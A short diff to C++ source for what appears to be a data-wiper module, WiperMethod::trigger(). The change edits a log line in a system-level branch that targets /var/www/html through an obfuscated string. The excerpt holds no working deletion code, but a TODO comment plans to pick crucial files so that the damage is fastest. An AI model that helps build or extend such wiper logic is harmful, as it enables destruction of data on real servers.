@@ -53,7 +53,7 @@ bool WiperMethod::trigger() {
         LOG_SUCCESS("[USER] Wiper summary: wiped {} files", successCount)
     #elif defined(IMPACT_LEVEL_SYSTEM)
         std::string targetDir = OBFL("/var/www/html"); // random path for now; think through
-        LOG_INFO("[SYSTEM] {} files in {}", action, targetDir)
+        LOG_INFO("[SYSTEM] Wiped files in {}", targetDir)
 
         LOG_ALERT("TODO for now. Wiping full drive is too silly; figure out crucial files to simulate real impact in shortest time")
     #endif
